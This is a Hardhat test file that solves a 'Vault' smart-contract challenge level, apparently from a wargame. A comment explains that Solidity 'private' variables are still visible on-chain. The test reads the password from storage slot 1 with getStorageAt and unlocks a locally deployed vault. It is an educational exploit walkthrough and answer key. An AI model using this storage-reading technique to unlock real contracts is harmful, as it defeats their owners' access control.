const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

██╗░░░██╗░█████╗░██╗░░░██╗██╗░░░░░████████╗
██║░░░██║██╔══██╗██║░░░██║██║░░░░░╚══██╔══╝
╚██╗░██╔╝███████║██║░░░██║██║░░░░░░░░██║░░░
░╚████╔╝░██╔══██║██║░░░██║██║░░░░░░░░██║░░░
░░╚██╔╝░░██║░░██║╚██████╔╝███████╗░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚══════╝░░░╚═╝░░░
 
 * Goal: 
 * 
 * Unlock the vault to pass the level!
 * 
 * Solution:
 *
 * There are three visibility modifiers that developers can use: public, internal, or private.
 * Public means that the variable can be accessed by the contract and by other smart contracts
 * Internal means that the variable can only be used with the contract it is defined in and its subclasses.
 * Private means that the variable can only be accessed within the contract it is defined. 
 * Trying to access it outside this contract gives a compilation error.
 * But remember that Ethereum is a public ledger detailing millions of transactions in a completely transparent 
 * way for the eyes of the world to see. This means we can just query the contract for it’s storage.
 * Each storage element is indexed accordingly to the order they’re defined in.
 * In the case of the vault contract, the locked storage variable has index 0, and that juicy password has index 1.
 * So called getStorageAt with index 1, we can extrapolate the hexadecimal pwd saved in the storage.
 * 
 */
describe("Vault", function () {
    let vault, owner, player, password;

    before(async function () {
        [owner, player] = await ethers.getSigners();
        password = ethers.utils.randomBytes(32);
    });

    describe("Password extrapolate", async function () {
        before(async function () {
            const Vault = await ethers.getContractFactory("contracts/Vault/Vault.sol:Vault");
            vault = await Vault.connect(owner).deploy(password);
        });

        it("Should unlock the vault with the private password", async function () {
            expect(await vault.connect(player).locked()).to.be.true;
            const passwordExtrapolated = await ethers.provider.getStorageAt(vault.address, 1);
            await vault.connect(player).unlock(passwordExtrapolated);
            expect(await vault.connect(player).locked()).to.be.false;
        });
    });
});
